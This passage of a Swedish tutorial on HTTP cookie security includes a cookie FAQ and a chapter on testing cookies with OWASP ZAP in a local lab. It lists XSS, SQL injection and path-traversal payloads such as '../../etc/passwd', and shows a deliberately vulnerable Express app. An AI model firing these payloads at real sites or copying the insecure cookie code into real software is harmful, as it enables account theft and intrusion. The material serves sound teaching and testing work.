- [PentesterLab](https://pentesterlab.com/)

**Bug Bounty Platforms:**
- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd](https://www.bugcrowd.com/)
- [Synack](https://www.synack.com/)

---

## FAQ (Frequently Asked Questions) ❓

### Grundläggande Frågor

**Q1: Kan jag radera cookies från min webbläsare?**

**A:** Ja! Alla moderna webbläsare låter dig radera cookies:

- **Chrome:** Settings → Privacy and Security → Cookies and other site data → See all cookies → Remove
- **Firefox:** Settings → Privacy & Security → Cookies and Site Data → Manage Data
- **Safari:** Preferences → Privacy → Manage Website Data

Du kan radera individuella cookies, alla från en specifik site, eller alla cookies helt.

---

**Q2: Vad är skillnaden mellan cookies och localStorage/sessionStorage?**

**A:**

| Feature | Cookies | localStorage | sessionStorage |
|---------|---------|-------------|----------------|
| **Kapacitet** | ~4 KB | ~5-10 MB | ~5-10 MB |
| **Skickas till server** | Ja (varje request) | Nej | Nej |
| **Tillgänglig från JavaScript** | Ja (om inte HttpOnly) | Ja | Ja |
| **Livslängd** | Konfigurerbar | Tills manuellt raderad | Tills tab stängs |
| **Cross-tab** | Ja | Ja | Nej |
| **CSRF-sårbar** | Ja (skickas automatiskt) | Nej | Nej |
| **XSS-sårbar** | Bara utan HttpOnly | Ja | Ja |

**Tumregel:**
- **Cookies:** Session management, authentication (server behöver data)
- **localStorage:** User preferences, offline data, caching
- **sessionStorage:** Temporary data per tab (wizard/multi-step forms)

---

**Q3: Är cookies farliga för min integritet?**

**A:** Det beror på:

**Ofarliga cookies:**
- Session cookies för inloggning
- Preferenser (språk, tema)
- Shopping cart

**Integritetskränkande cookies:**
- Third-party tracking cookies (reklam)
- Cross-site profiling
- Behavioral targeting

**Skydda dig:**
1. Använd Safari eller Firefox (blockerar trackers by default)
2. I Chrome: Settings → Block third-party cookies
3. Använd privacy extensions (uBlock Origin, Privacy Badger)
4. Rensa cookies regelbundet

---

**Q4: Behöver jag visa cookie-banner enligt GDPR?**

**A:** Ja, om du använder cookies som INTE är "strictly necessary".

**Strictly necessary (INGEN consent behövs):**
- Session cookies för inloggning
- Shopping cart
- Load balancing

**Consent KRÄVS för:**
- Analytics (Google Analytics, etc.)
- Advertising/tracking
- Social media widgets
- Embedded videos (YouTube, etc.)

**Korrekt implementation:**
```html
<!-- User måste AKTIVT acceptera (opt-in) -->
<!-- Pre-checked boxes är INTE OK -->
<!-- "Accept all" får inte vara enda alternativet -->
```

---

### Tekniska Frågor

**Q5: Varför ser jag "SameSite warning" i Chrome DevTools?**

**A:** Från Chrome 80+ (2020) är default `SameSite=Lax`. Om du sätter cookie utan `SameSite`:

```javascript
// Old way (warning):
document.cookie = "session=abc; Secure";

// Modern way (no warning):
document.cookie = "session=abc; Secure; SameSite=Strict";
```

För third-party cookies måste du explicit sätta `SameSite=None` + `Secure`:

```javascript
document.cookie = "tracking=xyz; Secure; SameSite=None";
```

---

**Q6: Kan jag sätta cookies från JavaScript?**

**A:** Ja, men med begränsningar:

```javascript
// Sätta cookie:
document.cookie = "name=value; Secure; SameSite=Strict; Max-Age=3600";

// Läsa cookies:
console.log(document.cookie); // "name1=value1; name2=value2"

// Problem:
// 1. Kan INTE sätta HttpOnly (säkerhetsskäl)
// 2. Kan INTE läsa HttpOnly cookies
// 3. Kan INTE sätta vissa attributes i alla browsers
// 4. Svårare att hantera än server-side

// Rekommendation: Sätt cookies server-side när möjligt
```

---

**Q7: Varför fungerar inte min cookie på localhost?**

**A:** Flera möjliga orsaker:

**Problem 1: Secure utan HTTPS**
```javascript
// ❌ Fungerar INTE på http://localhost
document.cookie = "session=abc; Secure";

// ✅ OK på http://localhost
document.cookie = "session=abc";

// ✅ Eller använd https://localhost (self-signed cert)
```

**Problem 2: Domain=localhost**
```javascript
// ❌ Fungerar INTE
document.cookie = "session=abc; Domain=localhost";

// ✅ Utelämna Domain helt
document.cookie = "session=abc";
```

**Problem 3: SameSite=None utan Secure**
```javascript
// ❌ Fungerar INTE
document.cookie = "session=abc; SameSite=None";

// ✅ SameSite=None KRÄVER Secure
document.cookie = "session=abc; SameSite=None; Secure"; // Kräver HTTPS!
```

---

**Q8: Hur stor kan en cookie vara?**

**A:**

**Limits:**
- **Per cookie:** 4096 bytes (4 KB) - name + value + attributes
- **Per domain:** 50-180 cookies (beroende på browser)
- **Total:** ~3000 cookies totalt

**Tips:**
```javascript
// ❌ Lagra INTE stora data i cookies
document.cookie = `data=${JSON.stringify(hugeObject)}`; // BAD!

// ✅ Lagra ID, fetcha data från server
document.cookie = `sessionId=abc123`; // GOOD
// Server: sessions[abc123] = { ...hugeObject }

// ✅ Eller använd localStorage för client-side data (5-10 MB)
```

---

**Q9: Kan cookies användas för cross-domain authentication?**

**A:** INTE direkt (cookies är domain-bound), men det finns workarounds:

**Option 1: Subdomains (same registrable domain)**
```javascript
// Sätt på example.com med Domain attribute:
Set-Cookie: session=abc; Domain=.example.com; Secure; HttpOnly

// Fungerar på:
// - example.com ✅
// - api.example.com ✅
// - shop.example.com ✅

// Fungerar INTE på:
// - different.com ❌
```

**Option 2: SSO (Single Sign-On)**
```
User logs in at:     auth.company.com
Wants access to:     app1.company.com, app2.company.com

Flow:
1. app1 redirects to auth.company.com
2. auth verifies session (cookie on auth.company.com)
3. auth creates one-time token
4. Redirects back to app1 with token
5. app1 validates token, creates own session cookie
```

**Option 3: JWT in Authorization header**
```javascript
// Client stores JWT (från login)
localStorage.setItem('token', jwt);

// Skickar till ALLA domains via Authorization header:
fetch('https://different-domain.com/api', {
  headers: {
    'Authorization': `Bearer ${jwt}`
  }
});

// Fungerar cross-domain ✅
// Men: XSS-vulnerable om i localStorage
```

---

**Q10: Vad är bästa sättet att implementera "Remember Me"?**

**A:**

**Säker implementation:**

```javascript
// 1. Persistent cookie med lång Max-Age
res.cookie('remember_token', secureRandomToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60 * 1000 // 30 dagar
});

// 2. Lagra token i database kopplat till user
await db.rememberTokens.insert({
  token: hashedToken, // Hash before storing!
  userId: user.id,
  createdAt: new Date(),
  expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000)
});

// 3. Vid nästa besök: Validera token
const token = req.cookies.remember_token;
const hashedToken = hash(token);
const tokenDoc = await db.rememberTokens.findOne({ token: hashedToken });

if (tokenDoc && tokenDoc.expiresAt > new Date()) {
  // Skapa ny session
  const sessionId = crypto.randomUUID();
  sessions[sessionId] = { userId: tokenDoc.userId };

  // Rotera remember token (extra security)
  const newToken = crypto.randomBytes(32).toString('hex');
  await db.rememberTokens.updateOne(
    { _id: tokenDoc._id },
    { token: hash(newToken), createdAt: new Date() }
  );

  res.cookie('remember_token', newToken, { ...cookieOptions });
  res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });
}

// 4. Logout: Radera remember token
await db.rememberTokens.deleteOne({ token: hashedToken });
res.clearCookie('remember_token');
```

**Säkerhetsaspekter:**
- ✅ Token är random och unguessable
- ✅ Token hashas before storage i DB
- ✅ Token roteras vid varje användning
- ✅ HttpOnly + Secure + SameSite
- ✅ Kan revokeras (finns i DB)

---

### Säkerhetsfrågor

**Q11: Hur vet jag om min site är sårbar för XSS cookie theft?**

**A:** Test:

**1. Kontrollera cookie attributes:**
```javascript
// Chrome DevTools → Application → Cookies
// Kolla "HttpOnly" column

// ✅ SAFE: HttpOnly = ✓
// ❌ VULNERABLE: HttpOnly = blank
```

**2. Test om JavaScript kan läsa cookien:**
```javascript
// I DevTools Console:
console.log(document.cookie);

// ✅ SAFE: Session cookie SAKNAS i output
// ❌ VULNERABLE: Session cookie SYNS
```

**3. Test XSS:**
```javascript
// Försök injektera script (on a test site you own!):
<script>alert(document.cookie)</script>

// ✅ SAFE: Script körs inte, eller cookie syns inte i alert
// ❌ VULNERABLE: Alert visar session cookie
```

**Fix:**
```javascript
// Server-side:
res.cookie('session', sessionId, {
  httpOnly: true,  // ← Add this!
  secure: true,
  sameSite: 'strict'
});
```

---

**Q12: Är det säkert att lagra JWT i cookies?**

**A:** JA, om du gör rätt:

```javascript
// ✅ SÄKERT:
res.cookie('jwt', token, {
  httpOnly: true,    // XSS-skydd
  secure: true,      // HTTPS only
  sameSite: 'strict', // CSRF-skydd
  maxAge: 15 * 60 * 1000 // Short-lived
});

// ❌ OSÄKERT:
res.json({ token }); // Client lagrar i localStorage
localStorage.setItem('jwt', token); // XSS-vulnerable!
```

**Fördelar med JWT i HttpOnly cookie:**
- ✅ XSS kan inte stjäla token
- ✅ SameSite skyddar mot CSRF
- ✅ Automatiskt skickas med requests (credentials: 'include')

**Nackdel:**
- ❌ Kan inte revokeras utan blacklist/short expiry + refresh tokens

---

**Q13: Ska jag använda cookie för API authentication?**

**A:** Beror på use case:

**Använd Cookies när:**
- Same-origin API (frontend och backend på samma domain)
- Server-rendered app
- Behöver HttpOnly-skydd
```javascript
// Example:
fetch('/api/data', {
  credentials: 'include' // Skickar cookies
});
```

**Använd Authorization Header när:**
- Cross-origin API (frontend och backend på olika domains)
- Mobile apps (native)
- Public API för third-party developers
```javascript
// Example:
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**Hybrid approach (bäst av båda):**
```javascript
// Backend sätter JWT i HttpOnly cookie
res.cookie('token', jwt, { httpOnly: true });

// Frontend använder credential mode
fetch('/api/data', { credentials: 'include' });

// För cross-origin: Extract token server-side, validate, continue
```

---

**Q14: Hur implementerar jag logout på flera devices?**

**A:**

**Problem med JWT (stateless):**
```javascript
// User loggar ut på Desktop
// Men JWT på Mobile är fortfarande valid! ❌
```

**Lösning 1: Refresh Token Pattern**
```javascript
// Alla devices har:
// - Short-lived access token (15 min) - i cookie/memory
// - Long-lived refresh token (7 days) - i DB

// Logout:
app.post('/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  // Delete ALLA refresh tokens för denna user
  await db.refreshTokens.deleteMany({ userId: req.user.id });

  // Efter 15 min kan ingen device få ny access token → logged out everywhere
});

// "Logout this device only":
app.post('/logout-device', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  await db.refreshTokens.deleteOne({ token: refreshToken });
});
```

**Lösning 2: Session-based med Redis**
```javascript
// Alla devices får unikt session ID

// Logout everywhere:
app.post('/logout-all', async (req, res) => {
  // Hitta alla sessions för user
  const keys = await redis.keys(`session:*`);
  for (const key of keys) {
    const session = await redis.get(key);
    if (JSON.parse(session).userId === req.user.id) {
      await redis.del(key);
    }
  }
});

// Logout current device:
app.post('/logout', async (req, res) => {
  await redis.del(`session:${req.cookies.sessionId}`);
});
```

---

**Q15: Vad är senaste best practices för cookie security 2025?**

**A:**

```javascript
// ✅ THE GOLD STANDARD 2025:

res.cookie('__Host-session', sessionId, {
  httpOnly: true,         // 1. XSS-skydd
  secure: true,           // 2. HTTPS only
  sameSite: 'strict',     // 3. CSRF-skydd (eller 'lax' om OAuth)
  path: '/',              // 4. Required för __Host-
  maxAge: 15 * 60 * 1000, // 5. Short-lived (15 min)
  // NO Domain attribute!  // 6. __Host- förhindrar subdomain attacks
});

// + Implement refresh token pattern
// + Session regeneration vid login
// + CSPRNG för session IDs (crypto.randomUUID())
// + Rate limiting på login
// + HTTPS everywhere (HSTS header)
// + CSP header
// + Regular security audits
```

**Checklista:**
- [ ] HttpOnly på alla session cookies
- [ ] Secure på ALLA cookies (production)
- [ ] SameSite=Strict (eller Lax med CSRF tokens)
- [ ] __Host- prefix för critical cookies
- [ ] Short expiration + refresh pattern
- [ ] Session regeneration vid login
- [ ] Input validation & output encoding
- [ ] HTTPS + HSTS
- [ ] Content Security Policy
- [ ] Regular dependency updates
- [ ] Security testing (automated + manual)

---

## Slutord 🎉

**Grattis!** Du har nu genomfört den mest omfattande svenska guiden om HTTP cookies - från grundläggande koncept till cutting-edge security och moderna standarder 2024-2025.

**Du har lärt dig:**
- ✅ Vad cookies är och hur de fungerar (Nivå 1-2)
- ✅ HTTP-protokollet och alla cookie attributes (Nivå 3)
- ✅ Säkerhetshot och försvar (XSS, CSRF, Session Hijacking) (Nivå 4)
- ✅ Modern cookie-utveckling, CHIPS, browser policies, RFC standards (Nivå 5)
- ✅ Praktiska implementationer med kod-exempel
- ✅ Real-world case studies
- ✅ Expert-level best practices

**Nästa steg:**

1. **Praktisera:** Bygg ett projekt med säker cookie-hantering
2. **Testa:** Använd browser DevTools för att analysera cookies på riktiga sites
3. **Fördjupa:** Utforska resurserna i "Resurser för fördjupning"
4. **Håll dig uppdaterad:** Följ browser release notes och security advisories
5. **Dela:** Lär andra om cookie security!

**Kom ihåg:**
- 🔒 Security är INTE en feature - det är en requirement
- 🛡️ Defense in depth - flera lager av försvar
- 🔄 Håll bibliotek och frameworks uppdaterade
- 📊 Logga och monitorera säkerhetshändelser
- 🧪 Testa allt - assume nothing

**Lycka till med din fortsatta resa inom web development och security!**

---


---

## BONUSKAPITEL: Säkerhetstestning av Cookies med OWASP ZAP 🔍

**Läsningstid:** 30-40 minuter
**Nivå:** Avancerad till Expert
**Förkunskaper:** Nivå 4-5 (säkerhetskunskap)

### Introduktion

Nu när du förstår cookie-säkerhet i teori är det dags att lära dig hur man **testar** det i praktiken. OWASP ZAP (Zed Attack Proxy) är världens mest populära open-source säkerhetstestverktyg för webbapplikationer. Det används av penetrationstestare, bug bounty hunters och utvecklare över hela världen.

**I detta bonuskapitel kommer du att lära dig:**
- Installera och konfigurera OWASP ZAP
- Testa cookies för säkerhetsbrister (HttpOnly, Secure, SameSite)
- Köra automatiserade scans
- Utföra manuell penetrationstesting
- Fuzzing och brute-force attacker på cookies
- Generera professionella säkerhetsrapporter
- Praktiska labs med verkliga sårbarheter

---

### 6.1 Vad är OWASP ZAP?

**OWASP ZAP (Zed Attack Proxy)** är ett open-source säkerhetsverktyg som fungerar som en "man-in-the-middle" proxy mellan din webbläsare och webbservern.

**Hur det fungerar:**

```
Browser ←→ ZAP Proxy ←→ Web Server

ZAP interceptar ALL trafik och kan:
- Inspektera requests och responses
- Modifiera data i realtid
- Identifiera säkerhetsbrister automatiskt
- Simulera attacker
- Generera rapporter
```

**Huvudfunktioner:**

| Funktion | Beskrivning |
|----------|-------------|
| **Passive Scanning** | Analyserar trafik utan att ändra den |
| **Active Scanning** | Skickar testattacker för att hitta sårbarheter |
| **Spider** | Crawlar webbplatsen och kartlägger alla sidor |
| **Fuzzer** | Testar med tusentals inputs för att hitta sårbarheter |
| **Forced Browse** | Hittar dolda filer och directories |
| **Manual Testing** | Intercepta och modifiera requests manuellt |
| **API Testing** | Testar REST/SOAP APIs |
| **Reporting** | Genererar professionella säkerhetsrapporter |

**Varför ZAP för cookie-testning?**

ZAP har specialiserade scanners för cookies:
- ✅ Cookie Without HttpOnly Flag
- ✅ Cookie Without Secure Flag
- ✅ Cookie Without SameSite Attribute
- ✅ Cookie Loosely Scoped
- ✅ Cookie Poisoning
- ✅ Session Fixation

---

### 6.2 Installation och Setup

#### 6.2.1 Installera ZAP

**Option 1: Download från officiella sidan**

```bash
# Besök: https://www.zaproxy.org/download/
# Välj version för ditt OS:
# - Windows: .exe installer
# - macOS: .dmg installer
# - Linux: .sh installer eller snap
```

**Option 2: Docker (Rekommenderat för CI/CD)**

```bash
# Pull latest ZAP image
docker pull ghcr.io/zaproxy/zaproxy:stable

# Run ZAP i headless mode
docker run -u zap -p 8080:8080 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh

# Access ZAP web UI på http://localhost:8080/zap
```

**Option 3: Package managers**

```bash
# Snap (Linux)
sudo snap install zaproxy --classic

# Homebrew (macOS)
brew install --cask owasp-zap

# Chocolatey (Windows)
choco install zap
```

#### 6.2.2 Första starten

1. **Starta ZAP**
2. **Välj Session Type:**
   - "Persist Session" - Spara resultat
   - "No, I do not want to persist this session" - Temporär testing

3. **API Key Setup (viktigt!):**
   ```
   Tools → Options → API
   - Generera nytt API key
   - Aktivera "Use API key"
   ```

4. **Konfigurera Browser Proxy:**

   **Firefox (Rekommenderat):**
   ```
   Settings → Network Settings → Manual proxy configuration
   HTTP Proxy: localhost
   Port: 8080
   ✓ Also use this proxy for HTTPS
   ✓ DNS over HTTPS = OFF
   ```

   **Chrome:**
   ```bash
   # Starta Chrome med proxy
   google-chrome --proxy-server=http://localhost:8080 --ignore-certificate-errors
   ```

5. **Installera ZAP Root CA Certificate:**

   ```
   Tools → Options → Dynamic SSL Certificates
   → Save (spara rootCA.crt)

   Importera i browser:
   Firefox: Settings → Privacy & Security → Certificates → Import
   Chrome: Settings → Security → Manage certificates → Import
   ```

---

### 6.3 Cookie Security Testing: Step-by-Step

#### 6.3.1 Skapa en Test Target

Först behöver vi en sårbar app att testa. Vi använder OWASP Juice Shop.

**Starta Juice Shop:**

```bash
# Docker
docker run -p 3000:3000 bkimminich/juice-shop

# Access på http://localhost:3000
```

**Alternativt: Skapa egen sårbar test-app:**

```javascript
// vulnerable-cookie-app.js
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

// ❌ SÅRBAR: Ingen HttpOnly, ingen Secure, ingen SameSite
app.get('/login-bad', (req, res) => {
  res.cookie('sessionId', 'abc123-vulnerable-cookie', {
    maxAge: 3600000
  });
  res.send('Logged in with INSECURE cookie!');
});

// ✅ SÄKER: Alla security flags
app.get('/login-good', (req, res) => {
  res.cookie('__Host-sessionId', 'xyz789-secure-cookie', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/',
    maxAge: 3600000
  });
  res.send('Logged in with SECURE cookie!');
});

// ❌ SÅRBAR: Cookie loosely scoped
app.get('/login-scoped', (req, res) => {
  res.cookie('session', 'scoped-cookie', {
    domain: '.example.com', // Tillgänglig för alla subdomäner!
    httpOnly: true,
    secure: true
  });
  res.send('Logged in with loosely scoped cookie!');
});

app.listen(3000, () => {
  console.log('Vulnerable app running on http://localhost:3000');
});
```

#### 6.3.2 Passive Scanning: Automatisk Cookie-analys

**Steg 1: Konfigurera Target**

```
1. I ZAP, gå till "Quick Start" tab
2. URL to attack: http://localhost:3000
3. Klicka "Attack"
```

**Steg 2: Browse applikationen**

```
1. I din proxied browser, besök http://localhost:3000
2. Logga in, navigera runt
3. ZAP interceptar automatiskt all trafik
```

**Steg 3: Analysera Cookies i ZAP**

```
ZAP → Information → Params tab → Select site
→ Cookie-listan visar ALLA cookies med flags:

Column view:
┌─────────────┬───────┬────────┬──────────┬────────┬──────┬─────┐
│ Name        │ Value │ Domain │ Path     │ Secure │ HTTP │ Same│
├─────────────┼───────┼────────┼──────────┼────────┼──────┼─────┤
│ sessionId   │ abc.. │ local..│ /        │ ❌     │ ❌   │ ❌  │
│ __Host-sess │ xyz.. │ local..│ /        │ ✅     │ ✅   │ Str │
└─────────────┴───────┴────────┴──────────┴────────┴──────┴─────┘
```

**Steg 4: Granska Alerts**

```
ZAP → Alerts tab

Du kommer se alerts som:
╔══════════════════════════════════════════════════╗
║ 🔴 Cookie No HttpOnly Flag                      ║
╠══════════════════════════════════════════════════╣
║ Risk: Low                                        ║
║ Confidence: Medium                               ║
║                                                  ║
║ Description:                                     ║
║ A cookie has been set without the HttpOnly      ║
║ flag, which means that the cookie can be        ║
║ accessed by JavaScript.                          ║
║                                                  ║
║ URL: http://localhost:3000/login-bad            ║
║ Cookie: sessionId=abc123-vulnerable-cookie      ║
║                                                  ║
║ Solution:                                        ║
║ Ensure that the HttpOnly flag is set for all    ║
║ cookies.                                         ║
╚══════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════╗
║ 🔴 Cookie Without Secure Flag                   ║
╠══════════════════════════════════════════════════╣
║ Risk: Low                                        ║
║ Confidence: Medium                               ║
║                                                  ║
║ Description:                                     ║
║ A cookie has been set without the secure flag,  ║
║ which means that the cookie can be accessed via ║
║ unencrypted connections.                         ║
║                                                  ║
║ Solution:                                        ║
║ Whenever a cookie contains sensitive information║
║ or is a session token, then it should always be ║
║ passed using an encrypted channel. Set the      ║
║ Secure flag on all cookies.                     ║
╚══════════════════════════════════════════════════╝
```

**Steg 5: Installera Cookie SameSite Scanner (Alpha)**

```
ZAP → Manage Add-ons → Marketplace
→ Sök "Cookie"
→ Installera "Passive scanner - Cookie without SameSite Attribute"
→ Restart ZAP

Efter omstart kommer ZAP också att rapportera:
╔══════════════════════════════════════════════════╗
║ 🟡 Cookie Without SameSite Attribute            ║
╠══════════════════════════════════════════════════╣
║ Risk: Low                                        ║
║ Confidence: Medium                               ║
║                                                  ║
║ Description:                                     ║
║ A cookie has been set without the SameSite      ║
║ attribute, which means that the cookie can be   ║
║ sent as a result of a 'cross-site' request.     ║
║                                                  ║
║ Solution:                                        ║
║ Set the SameSite attribute to 'Lax' or 'Strict'.║
╚══════════════════════════════════════════════════╝
```

#### 6.3.3 Active Scanning: Aggressiv Cookie-testning

Active scanning skickar faktiska attacker mot applikationen.

**⚠️ VARNING:** Kör ENDAST på applikationer du äger eller har tillstånd att testa!

**Steg 1: Konfigurera Active Scanner**

```
Tools → Options → Active Scan

Input Vectors:
✓ Cookie
✓ URL Query String
✓ POST data
✓ HTTP Headers

Tekniker att aktivera:
✓ SQL Injection
✓ XSS (Reflected)
✓ Path Traversal
✓ Session Fixation
```

**Steg 2: Starta Active Scan**

```
1. Högerklicka på target i Sites tree
2. Attack → Active Scan
3. Välj "Recurse" för att scanna alla sidor
4. Klicka "Start Scan"

ZAP kommer nu att:
- Skicka hundratals test-requests
- Försöka XSS i cookies
- Testa SQL injection i cookie values
- Kontrollera session fixation
- Fuzzing av cookie parameters
```

**Steg 3: Analysera Resultat**

```
Active Scan tab visar progress:
╔═══════════════════════════════════════════════════╗
║ Active Scan Progress                              ║
╠═══════════════════════════════════════════════════╣
║ Requests sent: 1247                               ║
║ Duration: 00:03:42                                ║
║ Requests/sec: 5.6                                 ║
║                                                   ║
║ Alerts found:                                     ║
║ 🔴 High: 2                                        ║
║ 🟠 Medium: 5                                      ║
║ 🟡 Low: 12                                        ║
║ ℹ️  Info: 8                                       ║
╚═══════════════════════════════════════════════════╝
```

**Exempel på Active Scan Alert:**

```
╔══════════════════════════════════════════════════╗
║ 🔴 Cookie Poisoning                              ║
╠══════════════════════════════════════════════════╣
║ Risk: High                                       ║
║ Confidence: Medium                               ║
║                                                  ║
║ Description:                                     ║
║ This check looks at user-supplied input in      ║
║ cookie parameters to try to identify any cross- ║
║ site scripting vulnerabilities.                  ║
║                                                  ║
║ Evidence:                                        ║
║ Injected: </script><script>alert(1)</script>    ║
║ Response contained: <script>alert(1)</script>   ║
║                                                  ║
║ Solution:                                        ║
║ Do not trust client side input, even if there   ║
║ is client side validation. Encode all user      ║
║ supplied input.                                  ║
╚══════════════════════════════════════════════════╝
```

---

### 6.4 Manuell Cookie Testing med ZAP

Ibland behöver du testa specifika scenarier manuellt.

#### 6.4.1 Intercepting Requests (Break Points)

**Scenario:** Testa om applikationen validerar cookie-värden.

**Steg 1: Aktivera Break Points**

```
1. ZAP → Top toolbar → Klicka "Set break on all requests" (paus-ikon)
2. I browser, navigera till http://localhost:3000/profile
3. ZAP kommer att intercepta requesten
```

**Steg 2: Modifiera Cookie**

```
I ZAP Break tab:

Request Headers:
GET /profile HTTP/1.1
Host: localhost:3000
Cookie: sessionId=abc123-valid-session    ← EDIT THIS

Testa olika saker:
1. Ändra till sessionId=hacked-value
2. Ändra till sessionId=' OR 1=1--
3. Ändra till sessionId=<script>alert(1)</script>
4. Ändra till sessionId=../../etc/passwd
5. Ta bort cookien helt

Klicka "Submit and continue to next breakpoint"
```

**Steg 3: Analysera Response**

```
Om applikationen INTE validerar:
HTTP/1.1 200 OK
Set-Cookie: sessionId=hacked-value  ← Server accepterade ogiltig cookie!

Om applikationen validerar korrekt:
HTTP/1.1 401 Unauthorized
{"error": "Invalid session"}  ← Bra!
```

#### 6.4.2 Manual Request Editor

För mer kontroll, använd Manual Request Editor.

```
1. Högerklicka på en request i History tab
2. "Open/Resend with Request Editor"

Editors:
┌─────────────────────────────────────────────┐
│ [ Request ] [ Response ]                    │
├─────────────────────────────────────────────┤
│ Method: [GET ▼] URL: /api/user/profile     │
├─────────────────────────────────────────────┤
│ Headers:                                    │
│ Host: localhost:3000                        │
│ Cookie: sessionId=MODIFY_THIS               │
│ User-Agent: Mozilla/5.0...                  │
├─────────────────────────────────────────────┤
│ Body:                                       │
│ (empty for GET)                             │
├─────────────────────────────────────────────┤
│           [ Send ]  [ Clear ]               │
└─────────────────────────────────────────────┘

Exempel tester:
1. XSS i cookie: sessionId=<img src=x onerror=alert(1)>
2. SQL injection: sessionId=' UNION SELECT * FROM users--
3. Path traversal: sessionId=../../../etc/passwd
4. Buffer overflow: sessionId=AAAA... (10000 A's)
5. Null byte: sessionId=abc%00.jpg
```

#### 6.4.3 Testing Session Fixation

**Scenario:** Testa om applikationen regenererar session-ID vid login.

**Steg 1: Logga request flow**

```
1. Clearar ZAP history (Sites → Right-click → Delete)
2. I browser: Logout från appen
3. Notera session cookie INNAN login
4. Logga in
5. Notera session cookie EFTER login
```

**Steg 2: Analysera i ZAP**

```
Sites → localhost:3000 → History tab

Sekvens:
┌────┬─────────────────┬────────────────────────────┐
│ #  │ URL             │ Cookie                     │
├────┼─────────────────┼────────────────────────────┤
│ 1  │ GET /login      │ -none-                     │
│ 2  │ POST /login     │ -none-                     │
│    │                 │ Response Set-Cookie:       │
│    │                 │   sessionId=pre-login-123  │ ← Before auth
│ 3  │ GET /dashboard  │ sessionId=pre-login-123    │
└────┴─────────────────┴────────────────────────────┘

❌ SÅRBAR: Session ID samma före och efter login!
   → Session Fixation vulnerability

Säker implementation:
┌────┬─────────────────┬────────────────────────────┐
│ 1  │ GET /login      │ -none-                     │
│ 2  │ POST /login     │ -none-                     │
│    │                 │ Response Set-Cookie:       │
│    │                 │   sessionId=NEW-ID-xyz789  │ ← Regenerated!
│ 3  │ GET /dashboard  │ sessionId=NEW-ID-xyz789    │
└────┴─────────────────┴────────────────────────────┘

✅ SÄKER: Nytt session ID efter autentisering
```

---

### 6.5 Fuzzing Cookies

Fuzzing testar applikationen med tusentals oväntade inputs.

#### 6.5.1 Basic Fuzzing

**Steg 1: Välj request att fuzza**

```
1. I History, högerklicka på en request med cookie
2. Attack → Fuzz...
```

**Steg 2: Konfigurera Fuzzer**

```
Fuzzer dialog:

Request:
GET /api/profile HTTP/1.1
Host: localhost:3000
Cookie: sessionId=abc123      ← Highlight "abc123"

Högerklicka på highlighted text → "Fuzz..."

Add Payload dialog:
┌─────────────────────────────────────────┐
│ Type: [File ▼]                          │
│ File: /path/to/fuzz-strings.txt         │
│ OR                                      │
│ Type: [Regex ▼]                         │
│ Pattern: [0-9]{32}   (test GUIDs)      │
│ OR                                      │
│ Type: [Numberzz ▼]                      │
│ From: 1                                 │
│ To: 1000                                │
└─────────────────────────────────────────┘

Klicka "Add" → "Start Fuzzer"
```

**Steg 3: Analysera Fuzzing Results**

```
Fuzzer tab visar resultat:
┌────┬─────────────────┬──────┬──────┬──────────┐
│ #  │ Payload         │ Code │ Size │ RTT (ms) │
├────┼─────────────────┼──────┼──────┼──────────┤
│ 1  │ abc123          │ 200  │ 1234 │ 45       │ ← Original
│ 2  │ 000000          │ 401  │ 56   │ 23       │
│ 3  │ 111111          │ 401  │ 56   │ 25       │
│ ...│ ...             │ ...  │ ...  │ ...      │
│ 42 │ admin123        │ 200  │ 1234 │ 47       │ ← ⚠️ HIT!
│ ...│ ...             │ ...  │ ...  │ ...      │
└────┴─────────────────┴──────┴──────┴──────────┘

Leta efter:
- 200 responses (successful access med olika session)
- Olika response sizes (indikerar olika content)
- Error messages i response body
```

#### 6.5.2 Advanced Fuzzing: XSS & SQLi

**XSS Fuzzing i Cookie:**

```
Använd ZAP's inbyggda XSS payloads:

Add Payload → Type: File Fuzzers
→ jbrofuzz → XSS → XSS.txt

Payloads inkluderar:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
';alert(String.fromCharCode(88,83,83))//
"><script>alert(String.fromCharCode(88,83,83))</script>

Efter fuzzing, analysera responses:
1. Sök efter payload reflected i HTML
2. Kontrollera om det escaped korrekt
3. Test i browser om ZAP hittar potential XSS
```

**SQL Injection Fuzzing:**

```
Add Payload → Type: File Fuzzers
→ jbrofuzz → SQL Injection → SQL Injection.txt

Payloads:
' OR 1=1--
' UNION SELECT NULL--
admin'--
' OR 'a'='a
1' AND '1'='1

Tecken på SQLi:
- SQL error messages i response
- Olika response för 1=1 vs 1=2
- Längre response time (indikerar DB query)
```

---

### 6.6 Automatiserad Cookie-testning med ZAP API

För CI/CD integration, använd ZAP's REST API.

#### 6.6.1 ZAP API Basics

**Start ZAP i daemon mode:**

```bash
# Start headless ZAP på port 8080
zap.sh -daemon -port 8080 -config api.key=CHANGE-ME-12345

# Eller Docker:
docker run -u zap -p 8080:8080 -i ghcr.io/zaproxy/zaproxy:stable \
  zap.sh -daemon -port 8080 -config api.key=CHANGE-ME-12345 \
  -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true
```

**Test API:**

```bash
# Health check
curl "http://localhost:8080/JSON/core/view/version/?apikey=CHANGE-ME-12345"

# Response:
{"version":"2.14.0"}
```

#### 6.6.2 Automated Cookie Security Scan

**Python script:**

```python
#!/usr/bin/env python3
import requests
import time
import json

ZAP_API_KEY = 'CHANGE-ME-12345'
ZAP_URL = 'http://localhost:8080'
TARGET = 'http://localhost:3000'

def zap_api(endpoint, params={}):
    """Call ZAP API"""
    params['apikey'] = ZAP_API_KEY
    response = requests.get(f'{ZAP_URL}/JSON/{endpoint}', params=params)
    return response.json()

def main():
    print("[*] Starting Cookie Security Scan")

    # 1. Access target (populate sites tree)
    print(f"[*] Accessing target: {TARGET}")
    zap_api('core/action/accessUrl', {'url': TARGET})
    time.sleep(2)

    # 2. Spider the target
